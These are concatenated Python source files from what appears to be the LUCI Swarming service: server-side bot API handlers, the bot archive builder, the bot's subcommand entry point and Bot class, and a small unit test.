        'grace_period': request.properties.grace_period_secs,
        'hard_timeout': request.properties.execution_timeout_secs,
        'host': utils.get_versioned_hosturl(),
        'io_timeout': request.properties.io_timeout_secs,
        'inputs_ref': request.properties.inputs_ref,
        'task_id': task_pack.pack_run_result_key(run_result_key),
      },
    }
    self.send_response(utils.to_json_encodable(out))

  def _cmd_sleep(self, sleep_streak, quarantined):
    out = {
      'cmd': 'sleep',
      'duration': task_scheduler.exponential_backoff(sleep_streak),
      'quarantined': quarantined,
    }
    self.send_response(out)

  def _cmd_terminate(self, task_id):
    out = {
      'cmd': 'terminate',
      'task_id': task_id,
    }
    self.send_response(out)

  def _cmd_update(self, expected_version):
    out = {
      'cmd': 'update',
      'version': expected_version,
    }
    self.send_response(out)

  def _cmd_restart(self, message):
    logging.info('Rebooting bot: %s', message)
    out = {
      'cmd': 'restart',
      'message': message,
    }
    self.send_response(out)


class BotEventHandler(_BotBaseHandler):
  """"""On signal that a bot had an event worth logging.""""""

  EXPECTED_KEYS = _BotBaseHandler.EXPECTED_KEYS | {u'event', u'message'}

  @auth.require(acl.is_bot)
  def post(self):
    (request, bot_id, version, state,
        dimensions, quarantined_msg) = self._process()
    event = request.get('event')
    if event not in ('bot_error', 'bot_rebooting', 'bot_shutdown'):
      self.abort_with_error(400, error='Unsupported event type')
    message = request.get('message')
    bot_management.bot_event(
        event_type=event, bot_id=bot_id, external_ip=self.request.remote_addr,
        dimensions=dimensions, state=state, version=version,
        quarantined=bool(quarantined_msg), task_id=None, task_name=None,
        message=message)

    if event == 'bot_error':
      line = (
          'Bot: https://%s/restricted/bot/%s\n'
          'Bot error:\n'
          '%s') % (
          app_identity.get_default_version_hostname(), bot_id, message)
      ereporter2.log_request(self.request, source='bot', message=line)
    self.send_response({})


class BotTaskUpdateHandler(auth.ApiHandler):
  """"""Receives updates from a Bot for a task.

  The handler verifies packets are processed in order and will refuse
  out-of-order packets.
  """"""
  ACCEPTED_KEYS = {
    u'bot_overhead', u'cost_usd', u'duration', u'exit_code',
    u'hard_timeout', u'id', u'io_timeout', u'isolated_stats', u'output',
    u'output_chunk_start', u'outputs_ref', u'task_id',
  }
  REQUIRED_KEYS = {u'id', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    # Unlike handshake and poll, we do not accept invalid keys here. This code
    # path is much more strict.
    request = self.parse_body()
    msg = log_unexpected_subset_keys(
        self.ACCEPTED_KEYS, self.REQUIRED_KEYS, request, self.request, 'bot',
        'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    bot_id = request['id']
    cost_usd = request['cost_usd']
    task_id = request['task_id']

    bot_overhead = request.get('bot_overhead')
    duration = request.get('duration')
    exit_code = request.get('exit_code')
    hard_timeout = request.get('hard_timeout')
    io_timeout = request.get('io_timeout')
    isolated_stats = request.get('isolated_stats')
    output = request.get('output')
    output_chunk_start = request.get('output_chunk_start')
    outputs_ref = request.get('outputs_ref')

    if bool(isolated_stats) != (bot_overhead is not None):
      ereporter2.log_request(
          request=self.request,
          source='server',
          category='task_failure',
          message='Failed to update task: %s' % task_id)
      self.abort_with_error(
          400,
          error='Both bot_overhead and isolated_stats must be set '
                'simultaneously\nbot_overhead: %s\nisolated_stats: %s' %
                (bot_overhead, isolated_stats))

    run_result_key = task_pack.unpack_run_result_key(task_id)
    performance_stats = None
    if isolated_stats:
      download = isolated_stats['download']
      upload = isolated_stats['upload']
      performance_stats = task_result.PerformanceStats(
          bot_overhead=bot_overhead,
          isolated_download=task_result.IsolatedOperation(
              duration=download['duration'],
              initial_number_items=download['initial_number_items'],
              initial_size=download['initial_size'],
              items_cold=base64.b64decode(download['items_cold']),
              items_hot=base64.b64decode(download['items_hot'])),
          isolated_upload=task_result.IsolatedOperation(
              duration=upload['duration'],
              items_cold=base64.b64decode(upload['items_cold']),
              items_hot=base64.b64decode(upload['items_hot'])))

    if output is not None:
      try:
        output = base64.b64decode(output)
      except UnicodeEncodeError as e:
        logging.error('Failed to decode output\n%s\n%r', e, output)
        output = output.encode('ascii', 'replace')
      except TypeError as e:
        # Save the output as-is instead. The error will be logged in ereporter2
        # and returning a HTTP 500 would only force the bot to stay in a retry
        # loop.
        logging.error('Failed to decode output\n%s\n%r', e, output)
    if outputs_ref:
      outputs_ref = task_request.FilesRef(**outputs_ref)

    try:
      state = task_scheduler.bot_update_task(
          run_result_key=run_result_key,
          bot_id=bot_id,
          output=output,
          output_chunk_start=output_chunk_start,
          exit_code=exit_code,
          duration=duration,
          hard_timeout=hard_timeout,
          io_timeout=io_timeout,
          cost_usd=cost_usd,
          outputs_ref=outputs_ref,
          performance_stats=performance_stats)
      if not state:
        logging.info('Failed to update, please retry')
        self.abort_with_error(500, error='Failed to update, please retry')

      if state in (task_result.State.COMPLETED, task_result.State.TIMED_OUT):
        action = 'task_completed'
      else:
        assert state == task_result.State.RUNNING, state
        action = 'task_update'
      bot_management.bot_event(
          event_type=action, bot_id=bot_id,
          external_ip=self.request.remote_addr, dimensions=None, state=None,
          version=None, quarantined=None, task_id=task_id, task_name=None)
    except ValueError as e:
      ereporter2.log_request(
          request=self.request,
          source='server',
          category='task_failure',
          message='Failed to update task: %s' % e)
      self.abort_with_error(400, error=str(e))
    except webob.exc.HTTPException:
      raise
    except Exception as e:
      logging.exception('Internal error: %s', e)
      self.abort_with_error(500, error=str(e))

    # TODO(maruel): When a task is canceled, reply with 'DIE' so that the bot
    # reboots itself to abort the task abruptly. It is useful when a task hangs
    # and the timeout was set too long or the task was superseded by a newer
    # task with more recent executable (e.g. a new Try Server job on a newer
    # patchset on Rietveld).
    self.send_response({'ok': True})


class BotTaskErrorHandler(auth.ApiHandler):
  """"""It is a specialized version of ereporter2's /ereporter2/api/v1/on_error
  that also attaches a task id to it.

  This formally kills the task, marking it as an internal failure. This can be
  used by bot_main.py to kill the task when task_runner misbehaved.
  """"""

  EXPECTED_KEYS = {u'id', u'message', u'task_id'}

  # TODO(vadimsh): Remove once bots use X-Whitelisted-Bot-Id or OAuth.
  xsrf_token_enforce_on = ()

  @auth.require(acl.is_bot)
  def post(self, task_id=None):
    request = self.parse_body()
    bot_id = request.get('id')
    task_id = request.get('task_id', '')
    message = request.get('message', 'unknown')

    bot_management.bot_event(
        event_type='task_error', bot_id=bot_id,
        external_ip=self.request.remote_addr, dimensions=None, state=None,
        version=None, quarantined=None, task_id=task_id, task_name=None,
        message=message)
    line = (
        'Bot: https://%s/restricted/bot/%s\n'
        'Task failed: https://%s/user/task/%s\n'
        '%s') % (
        app_identity.get_default_version_hostname(), bot_id,
        app_identity.get_default_version_hostname(), task_id,
        message)
    ereporter2.log_request(self.request, source='bot', message=line)

    msg = log_unexpected_keys(
        self.EXPECTED_KEYS, request, self.request, 'bot', 'keys')
    if msg:
      self.abort_with_error(400, error=msg)

    msg = task_scheduler.bot_kill_task(
        task_pack.unpack_run_result_key(task_id), bot_id)
    if msg:
      logging.error(msg)
      self.abort_with_error(400, error=msg)
    self.send_response({})


class ServerPingHandler(webapp2.RequestHandler):
  """"""Handler to ping when checking if the server is up.

  This handler should be extremely lightweight. It shouldn't do any
  computations, it should just state that the server is up. It's open to
  everyone for simplicity and performance.
  """"""

  def get(self):
    self.response.headers['Content-Type'] = 'text/plain; charset=utf-8'
    self.response.out.write('Server up')


def get_routes():
  routes = [
      ('/bootstrap', BootstrapHandler),
      ('/bot_code', BotCodeHandler),
      ('/swarming/api/v1/bot/bot_code/<version:[0-9a-f]{40}>', BotCodeHandler),
      ('/swarming/api/v1/bot/event', BotEventHandler),
      ('/swarming/api/v1/bot/handshake', BotHandshakeHandler),
      ('/swarming/api/v1/bot/poll', BotPollHandler),
      ('/swarming/api/v1/bot/server_ping', ServerPingHandler),
      ('/swarming/api/v1/bot/task_update', BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_update/<task_id:[a-f0-9]+>',
          BotTaskUpdateHandler),
      ('/swarming/api/v1/bot/task_error', BotTaskErrorHandler),
      ('/swarming/api/v1/bot/task_error/<task_id:[a-f0-9]+>',
          BotTaskErrorHandler),
  ]
  return [webapp2.Route(*i) for i in routes]
/n/n/n/appengine/swarming/server/bot_archive.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Generates the swarming_bot.zip archive for the bot.

Unlike the other source files, this file can be run from ../tools/bot_archive.py
stand-alone to generate a swarming_bot.zip for local testing so it doesn't
import anything from the AppEngine SDK.

The hash of the content of the files in the archive is used to define the
current version of the swarming bot code.
""""""

import hashlib
import json
import logging
import os
import StringIO
import zipfile


# List of files needed by the swarming bot.
# TODO(maruel): Make the list automatically generated?
FILES = (
    '__main__.py',
    'api/__init__.py',
    'api/bot.py',
    'api/parallel.py',
    'api/os_utilities.py',
    'api/platforms/__init__.py',
    'api/platforms/android.py',
    'api/platforms/common.py',
    'api/platforms/gce.py',
    'api/platforms/linux.py',
    'api/platforms/osx.py',
    'api/platforms/posix.py',
    'api/platforms/win.py',
    'bot_code/__init__.py',
    'bot_code/bot_main.py',
    'bot_code/common.py',
    'bot_code/singleton.py',
    'bot_code/task_runner.py',
    'bot_code/xsrf_client.py',
    'client/auth.py',
    'client/isolated_format.py',
    'client/isolateserver.py',
    'client/run_isolated.py',
    'config/__init__.py',
    'third_party/__init__.py',
    'third_party/colorama/__init__.py',
    'third_party/colorama/ansi.py',
    'third_party/colorama/ansitowin32.py',
    'third_party/colorama/initialise.py',
    'third_party/colorama/win32.py',
    'third_party/colorama/winterm.py',
    'third_party/depot_tools/__init__.py',
    'third_party/depot_tools/fix_encoding.py',
    'third_party/depot_tools/subcommand.py',
    'third_party/httplib2/__init__.py',
    'third_party/httplib2/cacerts.txt',
    'third_party/httplib2/iri2uri.py',
    'third_party/httplib2/socks.py',
    'third_party/oauth2client/__init__.py',
    'third_party/oauth2client/_helpers.py',
    'third_party/oauth2client/_openssl_crypt.py',
    'third_party/oauth2client/_pycrypto_crypt.py',
    'third_party/oauth2client/client.py',
    'third_party/oauth2client/clientsecrets.py',
    'third_party/oauth2client/crypt.py',
    'third_party/oauth2client/file.py',
    'third_party/oauth2client/gce.py',
    'third_party/oauth2client/keyring_storage.py',
    'third_party/oauth2client/locked_file.py',
    'third_party/oauth2client/multistore_file.py',
    'third_party/oauth2client/service_account.py',
    'third_party/oauth2client/tools.py',
    'third_party/oauth2client/util.py',
    'third_party/oauth2client/xsrfutil.py',
    'third_party/pyasn1/pyasn1/__init__.py',
    'third_party/pyasn1/pyasn1/codec/__init__.py',
    'third_party/pyasn1/pyasn1/codec/ber/__init__.py',
    'third_party/pyasn1/pyasn1/codec/ber/decoder.py',
    'third_party/pyasn1/pyasn1/codec/ber/encoder.py',
    'third_party/pyasn1/pyasn1/codec/ber/eoo.py',
    'third_party/pyasn1/pyasn1/codec/cer/__init__.py',
    'third_party/pyasn1/pyasn1/codec/cer/decoder.py',
    'third_party/pyasn1/pyasn1/codec/cer/encoder.py',
    'third_party/pyasn1/pyasn1/codec/der/__init__.py',
    'third_party/pyasn1/pyasn1/codec/der/decoder.py',
    'third_party/pyasn1/pyasn1/codec/der/encoder.py',
    'third_party/pyasn1/pyasn1/compat/__init__.py',
    'third_party/pyasn1/pyasn1/compat/binary.py',
    'third_party/pyasn1/pyasn1/compat/octets.py',
    'third_party/pyasn1/pyasn1/debug.py',
    'third_party/pyasn1/pyasn1/error.py',
    'third_party/pyasn1/pyasn1/type/__init__.py',
    'third_party/pyasn1/pyasn1/type/base.py',
    'third_party/pyasn1/pyasn1/type/char.py',
    'third_party/pyasn1/pyasn1/type/constraint.py',
    'third_party/pyasn1/pyasn1/type/error.py',
    'third_party/pyasn1/pyasn1/type/namedtype.py',
    'third_party/pyasn1/pyasn1/type/namedval.py',
    'third_party/pyasn1/pyasn1/type/tag.py',
    'third_party/pyasn1/pyasn1/type/tagmap.py',
    'third_party/pyasn1/pyasn1/type/univ.py',
    'third_party/pyasn1/pyasn1/type/useful.py',
    'third_party/requests/__init__.py',
    'third_party/requests/adapters.py',
    'third_party/requests/api.py',
    'third_party/requests/auth.py',
    'third_party/requests/certs.py',
    'third_party/requests/compat.py',
    'third_party/requests/cookies.py',
    'third_party/requests/exceptions.py',
    'third_party/requests/hooks.py',
    'third_party/requests/models.py',
    'third_party/requests/packages/__init__.py',
    'third_party/requests/packages/urllib3/__init__.py',
    'third_party/requests/packages/urllib3/_collections.py',
    'third_party/requests/packages/urllib3/connection.py',
    'third_party/requests/packages/urllib3/connectionpool.py',
    'third_party/requests/packages/urllib3/contrib/__init__.py',
    'third_party/requests/packages/urllib3/contrib/ntlmpool.py',
    'third_party/requests/packages/urllib3/contrib/pyopenssl.py',
    'third_party/requests/packages/urllib3/exceptions.py',
    'third_party/requests/packages/urllib3/fields.py',
    'third_party/requests/packages/urllib3/filepost.py',
    'third_party/requests/packages/urllib3/packages/__init__.py',
    'third_party/requests/packages/urllib3/packages/ordered_dict.py',
    'third_party/requests/packages/urllib3/packages/six.py',
    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'
        '__init__.py',
    'third_party/requests/packages/urllib3/packages/ssl_match_hostname/'
        '_implementation.py',
    'third_party/requests/packages/urllib3/poolmanager.py',
    'third_party/requests/packages/urllib3/request.py',
    'third_party/requests/packages/urllib3/response.py',
    'third_party/requests/packages/urllib3/util/__init__.py',
    'third_party/requests/packages/urllib3/util/connection.py',
    'third_party/requests/packages/urllib3/util/request.py',
    'third_party/requests/packages/urllib3/util/response.py',
    'third_party/requests/packages/urllib3/util/retry.py',
    'third_party/requests/packages/urllib3/util/ssl_.py',
    'third_party/requests/packages/urllib3/util/timeout.py',
    'third_party/requests/packages/urllib3/util/url.py',
    'third_party/requests/sessions.py',
    'third_party/requests/status_codes.py',
    'third_party/requests/structures.py',
    'third_party/requests/utils.py',
    'third_party/rsa/rsa/__init__.py',
    'third_party/rsa/rsa/_compat.py',
    'third_party/rsa/rsa/_version133.py',
    'third_party/rsa/rsa/_version200.py',
    'third_party/rsa/rsa/asn1.py',
    'third_party/rsa/rsa/bigfile.py',
    'third_party/rsa/rsa/cli.py',
    'third_party/rsa/rsa/common.py',
    'third_party/rsa/rsa/core.py',
    'third_party/rsa/rsa/key.py',
    'third_party/rsa/rsa/parallel.py',
    'third_party/rsa/rsa/pem.py',
    'third_party/rsa/rsa/pkcs1.py',
    'third_party/rsa/rsa/prime.py',
    'third_party/rsa/rsa/randnum.py',
    'third_party/rsa/rsa/transform.py',
    'third_party/rsa/rsa/util.py',
    'third_party/rsa/rsa/varblock.py',
    'third_party/six/__init__.py',
    'utils/__init__.py',
    'utils/cacert.pem',
    'utils/file_path.py',
    'utils/fs.py',
    'utils/large.py',
    'utils/logging_utils.py',
    'utils/lru.py',
    'utils/net.py',
    'utils/oauth.py',
    'utils/on_error.py',
    'utils/subprocess42.py',
    'utils/threading_utils.py',
    'utils/tools.py',
    'utils/zip_package.py',
    'adb/__init__.py',
    'adb/adb_commands.py',
    'adb/adb_protocol.py',
    'adb/common.py',
    'adb/contrib/__init__.py',
    'adb/contrib/adb_commands_safe.py',
    'adb/contrib/high.py',
    'adb/contrib/parallel.py',
    'adb/fastboot.py',
    'adb/filesync_protocol.py',
    'adb/sign_pythonrsa.py',
    'adb/usb_exceptions.py',
    'python_libusb1/__init__.py',
    'python_libusb1/libusb1.py',
    'python_libusb1/usb1.py',
)


def is_windows():
  """"""Returns True if this code is running under Windows.""""""
  return os.__file__[0] != '/'


def resolve_symlink(path):
  """"""Processes path containing symlink on Windows.

  This is needed to make ../swarming_bot/main_test.py pass on Windows because
  git on Windows renders symlinks as normal files.
  """"""
  if not is_windows():
    # Only does this dance on Windows.
    return path
  parts = os.path.normpath(path).split(os.path.sep)
  for i in xrange(2, len(parts)):
    partial = os.path.sep.join(parts[:i])
    if os.path.isfile(partial):
      with open(partial) as f:
        link = f.read()
      assert '\n' not in link and link, link
      parts[i-1] = link
  return os.path.normpath(os.path.sep.join(parts))


def yield_swarming_bot_files(root_dir, host, host_version, additionals):
  """"""Yields all the files to map as tuple(filename, content).

  config.json is injected with json data about the server.

  This function guarantees that the output is sorted by filename.
  """"""
  items = {i: None for i in FILES}
  items.update(additionals)
  config = {
    'server': host.rstrip('/'),
    'server_version': host_version,
  }
  items['config/config.json'] = json.dumps(config)
  for item, content in sorted(items.iteritems()):
    if content is not None:
      yield item, content
    else:
      with open(resolve_symlink(os.path.join(root_dir, item)), 'rb') as f:
        yield item, f.read()


def get_swarming_bot_zip(root_dir, host, host_version, additionals):
  """"""Returns a zipped file of all the files a bot needs to run.

  Arguments:
    root_dir: directory swarming_bot.
    additionals: dict(filepath: content) of additional items to put into the zip
        file, in addition to FILES and MAPPED. In practice, it's going to be a
        custom bot_config.py.
  Returns:
    Tuple(str being the zipped file's content, bot version (SHA-1) it
    represents).
  """"""
  zip_memory_file = StringIO.StringIO()
  h = hashlib.sha1()
  with zipfile.ZipFile(zip_memory_file, 'w', zipfile.ZIP_DEFLATED) as zip_file:
    for name, content in yield_swarming_bot_files(
        root_dir, host, host_version, additionals):
      zip_file.writestr(name, content)
      h.update(str(len(name)))
      h.update(name)
      h.update(str(len(content)))
      h.update(content)

  data = zip_memory_file.getvalue()
  bot_version = h.hexdigest()
  logging.info(
      'get_swarming_bot_zip(%s) is %d bytes; %s',
      additionals.keys(), len(data), bot_version)
  return data, bot_version


def get_swarming_bot_version(root_dir, host, host_version, additionals):
  """"""Returns the SHA1 hash of the bot code, representing the version.

  Arguments:
    root_dir: directory swarming_bot.
    additionals: See get_swarming_bot_zip's doc.

  Returns:
    The SHA1 hash of the bot code.
  """"""
  h = hashlib.sha1()
  try:
    # TODO(maruel): Deduplicate from zip_package.genereate_version().
    for name, content in yield_swarming_bot_files(
        root_dir, host, host_version, additionals):
      h.update(str(len(name)))
      h.update(name)
      h.update(str(len(content)))
      h.update(content)
  except IOError:
    logging.warning('Missing expected file. Hash will be invalid.')
  bot_version = h.hexdigest()
  logging.info(
      'get_swarming_bot_version(%s) = %s', sorted(additionals), bot_version)
  return bot_version
/n/n/n/appengine/swarming/swarming_bot/__main__.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Runs either task_runner.py, bot_main.py or bot_config.py.

The imports are done late so if an ImportError occurs, it is localized to this
command only.
""""""

import code
import json
import logging
import os
import optparse
import shutil
import sys
import zipfile

from bot_code import common

# That's from ../../../client/
from third_party.depot_tools import fix_encoding
from utils import logging_utils
from utils import zip_package

# This file can only be run as a zip.
THIS_FILE = os.path.abspath(zip_package.get_main_script_path())


# libusb1 expects to be directly in sys.path.
sys.path.insert(0, os.path.join(THIS_FILE, 'python_libusb1'))


# TODO(maruel): Use depot_tools/subcommand.py. The goal here is to have all the
# sub commands packed into the single .zip file as a swiss army knife (think
# busybox but worse).


def CMDattributes(_args):
  """"""Prints out the bot's attributes.""""""
  from bot_code import bot_main
  json.dump(
      bot_main.get_attributes(bot_main.get_bot()), sys.stdout, indent=2,
      sort_keys=True, separators=(',', ': '))
  print('')
  return 0


def CMDconfig(_args):
  """"""Prints the config.json embedded in this zip.""""""
  logging_utils.prepare_logging(None)
  from bot_code import bot_main
  json.dump(bot_main.get_config(), sys.stdout, indent=2, sort_keys=True)
  print('')
  return 0


def CMDis_fine(_args):
  """"""Just reports that the code doesn't throw.

  That ensures that the bot has minimal viability before transfering control to
  it. For now, it just imports bot_main but later it'll check the config, etc.
  """"""
  # pylint: disable=unused-variable
  from bot_code import bot_main
  from config import bot_config
  # We're #goodenough.
  return 0


def CMDrestart(_args):
  """"""Utility subcommand that hides the difference between each OS to reboot
  the host.""""""
  logging_utils.prepare_logging(None)
  import os_utilities
  # This function doesn't return.
  os_utilities.restart()
  # Should never reach here.
  return 1


def CMDrun_isolated(args):
  """"""Internal command to run an isolated command.""""""
  sys.path.insert(0, os.path.join(THIS_FILE, 'client'))
  # run_isolated setups logging by itself.
  import run_isolated
  return run_isolated.main(args)


def CMDsetup(_args):
  """"""Setup the bot to auto-start but doesn't start the bot.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))
  from bot_code import bot_main
  bot_main.setup_bot(True)
  return 0


def CMDserver(_args):
  """"""Prints the server url. It's like 'config' but easier to parse.""""""
  logging_utils.prepare_logging(None)
  from bot_code import bot_main
  print bot_main.get_config()['server']
  return 0


def CMDshell(args):
  """"""Starts a shell with api.* in..""""""
  logging_utils.prepare_logging(None)
  logging_utils.set_console_level(logging.DEBUG)

  from bot_code import bot_main
  from api import os_utilities
  from api import platforms
  local_vars = {
    'bot_main': bot_main,
    'json': json,
    'os_utilities': os_utilities,
    'platforms': platforms,
  }
  # Can't use: from api.platforms import *
  local_vars.update(
      (k, v) for k, v in platforms.__dict__.iteritems()
      if not k.startswith('_'))

  if args:
    for arg in args:
      exec code.compile_command(arg) in local_vars
  else:
    code.interact(
        'Locals:\n  ' + '\n  '.join( sorted(local_vars)), None, local_vars)
  return 0


def CMDstart_bot(args):
  """"""Starts the swarming bot.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'swarming_bot.log'))
  logging.info(
      'importing bot_main: %s, %s', THIS_FILE, zip_package.generate_version())
  from bot_code import bot_main
  result = bot_main.main(args)
  logging.info('bot_main exit code: %d', result)
  return result


def CMDstart_slave(args):
  """"""Ill named command that actually sets up the bot then start it.""""""
  # TODO(maruel): Rename function.
  logging_utils.prepare_logging(os.path.join('logs', 'bot_config.log'))

  parser = optparse.OptionParser()
  parser.add_option(
      '--survive', action='store_true',
      help='Do not reboot the host even if bot_config.setup_bot() asked to')
  options, args = parser.parse_args(args)

  try:
    from bot_code import bot_main
    bot_main.setup_bot(options.survive)
  except Exception:
    logging.exception('bot_main.py failed.')

  logging.info('Starting the bot: %s', THIS_FILE)
  return common.exec_python([THIS_FILE, 'start_bot'])


def CMDtask_runner(args):
  """"""Internal command to run a swarming task.""""""
  logging_utils.prepare_logging(os.path.join('logs', 'task_runner.log'))
  from bot_code import task_runner
  return task_runner.main(args)


def CMDversion(_args):
  """"""Prints the version of this file and the hash of the code.""""""
  logging_utils.prepare_logging(None)
  print zip_package.generate_version()
  return 0


def main():
  if os.getenv('CHROME_REMOTE_DESKTOP_SESSION') == '1':
    # Disable itself when run under Google Chrome Remote Desktop, as it's
    # normally started at the console and starting up via Remote Desktop would
    # cause multiple bots to run concurrently on the host.
    print >> sys.stderr, (
        'Inhibiting Swarming bot under Google Chrome Remote Desktop.')
    return 0

  # Always make the current working directory the directory containing this
  # file. It simplifies assumptions.
  os.chdir(os.path.dirname(THIS_FILE))
  # Always create the logs dir first thing, before printing anything out.
  if not os.path.isdir('logs'):
    os.mkdir('logs')

  # This is necessary so os.path.join() works with unicode path. No kidding.
  # This must be done here as each of the command take wildly different code
  # path and this must be run in every case, as it causes really unexpected
  # issues otherwise, especially in module os.path.
  fix_encoding.fix_encoding()

  if os.path.basename(THIS_FILE) == 'swarming_bot.zip':
    # Self-replicate itself right away as swarming_bot.1.zip and restart as it.
    print >> sys.stderr, 'Self replicating pid:%d.' % os.getpid()
    if os.path.isfile('swarming_bot.1.zip'):
      os.remove('swarming_bot.1.zip')
    shutil.copyfile('swarming_bot.zip', 'swarming_bot.1.zip')
    cmd = ['swarming_bot.1.zip'] + sys.argv[1:]
    print >> sys.stderr, 'cmd: %s' % cmd
    return common.exec_python(cmd)

  # sys.argv[0] is the zip file itself.
  cmd = 'start_slave'
  args = []
  if len(sys.argv) > 1:
    cmd = sys.argv[1]
    args = sys.argv[2:]

  fn = getattr(sys.modules[__name__], 'CMD%s' % cmd, None)
  if fn:
    try:
      return fn(args)
    except ImportError:
      logging.exception('Failed to run %s', cmd)
      with zipfile.ZipFile(THIS_FILE, 'r') as f:
        logging.error('Files in %s:\n%s', THIS_FILE, f.namelist())
      return 1

  print >> sys.stderr, 'Unknown command %s' % cmd
  return 1


if __name__ == '__main__':
  sys.exit(main())
/n/n/n/appengine/swarming/swarming_bot/api/bot.py/n/n# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

""""""Bot interface used in bot_config.py.""""""

import logging
import os
import threading
import time

import os_utilities
from utils import zip_package

THIS_FILE = os.path.abspath(zip_package.get_main_script_path())

# Method could be a function - pylint: disable=R0201


class Bot(object):
  def __init__(
      self, remote, attributes, server, server_version, base_dir,
      shutdown_hook):
    # Do not expose attributes nor remote for now, as attributes will be
    # refactored soon and remote would have a lot of side effects if used by
    # bot_config.
    self._attributes = attributes
    self._base_dir = base_dir
    self._remote = remote
    self._server = server
    self._server_version = server_version
    self._shutdown_hook = shutdown_hook
    self._timers = []
    self._timers_dying = False
    self._timers_lock = threading.Lock()

  @property
  def base_dir(self):
    """"""Returns the working directory.

    It is normally the current workind directory, e.g. os.getcwd() but it is
    preferable to not assume that.
    """"""
    return self._base_dir

  @property
  def dimensions(self):
    """"""The bot's current dimensions.

    Dimensions are relatively static and not expected to change much. They
    should change only when it effectively affects the bot's capacity to execute
    tasks.
    """"""
    return self._attributes.get('dimensions', {}).copy()

  @property
  def id(self):
    """"""Returns the bot's ID.""""""
    return self.dimensions.get('id', ['unknown'])[0]

  @property
  def remote(self):
    """"""XsrfClient instance to talk to the server.

    Should not be normally used by bot_config.py for now.
    """"""
    return self._remote

  @property
  def server(self):
    """"""URL of the swarming server this bot is connected to.

    It includes the https:// prefix but without trailing /, so it looks like
    ""https://foo-bar.appspot.com"".
    """"""
    return self._server

  @property
  def server_version(self):
    """"""Version of the server's implementation.

    The form is nnn-hhhhhhh for pristine version and nnn-hhhhhhh-tainted-uuuu
    for non-upstreamed code base:
      nnn: revision pseudo number
      hhhhhhh: git commit hash
      uuuu: username
    """"""
    return self._server_version

  @property
  def state(self):
    return self._attributes['state']

  @property
  def swarming_bot_zip(self):
    """"""Absolute path to the swarming_bot.zip file.

    The bot itself is run as swarming_bot.1.zip or swarming_bot.2.zip. Always
    return swarming_bot.zip since this is the script that must be used when
    starting up.
    """"""
    return os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip')

  def post_event(self, event_type, message):
    """"""Posts an event to the server.""""""
    data = self._attributes.copy()
    data['event'] = event_type
    data['message'] = message
    self._remote.url_read_json('/swarming/api/v1/bot/event', data=data)

  def post_error(self, message):
    """"""Posts given string as a failure.

    This is used in case of internal code error. It traps exception.
    """"""
    logging.error('Error: %s\n%s', self._attributes, message)
    try:
      self.post_event('bot_error', message)
    except Exception:
      logging.exception('post_error(%s) failed.', message)

  def restart(self, message):
    """"""Reboots the machine.

    If the reboot is successful, never returns: the process should just be
    killed by OS.

    If reboot fails, logs the error to the server and moves the bot to
    quarantined mode.
    """"""
    self.post_event('bot_rebooting', message)
    self.cancel_all_timers()
    if self._shutdown_hook:
      try:
        self._shutdown_hook(self)
      except Exception as e:
        logging.exception('shutdown hook failed: %s', e)
    # os_utilities.restart should never return, unless restart is not happening.
    # If restart is taking longer than N minutes, it probably not going to
    # finish at all. Report this to the server.
    try:
      os_utilities.restart(message, timeout=15*60)
    except LookupError:
      # This is a special case where OSX is deeply hosed. In that case the disk
      # is likely in read-only mode and there isn't much that can be done. This
      # exception is deep inside pickle.py. So notify the server then hang in
      # there.
      self.post_error('This host partition is bad; please fix the host')
      while True:
        time.sleep(1)
    self.post_error('Bot is stuck restarting for: %s' % message)

  def call_later(self, delay_sec, callback):
    """"""Schedules a function to be called later (if bot is still running).

    All calls are executed in a separate internal thread, be careful with what
    you call from there (Bot object is generally not thread safe).

    Multiple callbacks can be executed concurrently. It is safe to call
    'call_later' from the callback.
    """"""
    timer = None

    def call_wrapper():
      with self._timers_lock:
        # Canceled already?
        if timer not in self._timers:
          return
        self._timers.remove(timer)
      try:
        callback()
      except Exception:
        logging.exception('Timer callback failed')

    with self._timers_lock:
      if not self._timers_dying:
        timer = threading.Timer(delay_sec, call_wrapper)
        self._timers.append(timer)
        timer.daemon = True
        timer.start()

  def cancel_all_timers(self):
    """"""Cancels all pending 'call_later' calls and forbids adding new ones.""""""
    timers = None
    with self._timers_lock:
      self._timers_dying = True
      for t in self._timers:
        t.cancel()
      timers, self._timers = self._timers, []
    for t in timers:
      t.join(timeout=5)
      if t.isAlive():
        logging.error('Timer thread did not terminate fast enough: %s', t)

  def update_dimensions(self, new_dimensions):
    """"""Called internally to update Bot.dimensions.""""""
    self._attributes['dimensions'] = new_dimensions

  def update_state(self, new_state):
    """"""Called internally to update Bot.state.""""""
    self._attributes['state'] = new_state
/n/n/n/appengine/swarming/swarming_bot/api/bot_test.py/n/n#!/usr/bin/env python
# Copyright 2014 The LUCI Authors. All rights reserved.
# Use of this source code is governed by the Apache v2.0 license that can be
# found in the LICENSE file.

import os
import sys
import unittest
import threading

THIS_FILE = os.path.abspath(__file__)

import test_env_api
test_env_api.setup_test_env()

import bot


class TestBot(unittest.TestCase):
  def test_bot(self):
    obj = bot.Bot(
        None,
        {'dimensions': {'foo': 'bar'}},
        'https://localhost:1/',
        '1234-1a2b3c4-tainted-joe',
        'base_dir',
        None)
    self.assertEqual({'foo': 'bar'}, obj.dimensions)
    self.assertEqual(
        os.path.join(os.path.dirname(THIS_FILE), 'swarming_bot.zip'),
        obj.swarming_bot_zip)
    self.assertEqual('1234-1a2b3c4-tainted-joe', obj.server_version)
    self.assertEqual('base_dir', obj.base_dir)

  def test_bot_call_later(self):
    obj = bot.Bot(None, {}, 'https://localhost:1/', '1234-1a2b3c4-tainted-joe',
                  'base_dir', None)
    ev = threading.Event()
    obj.call_later(0.001, ev.set)
    self.assertTrue(ev.wait(1))

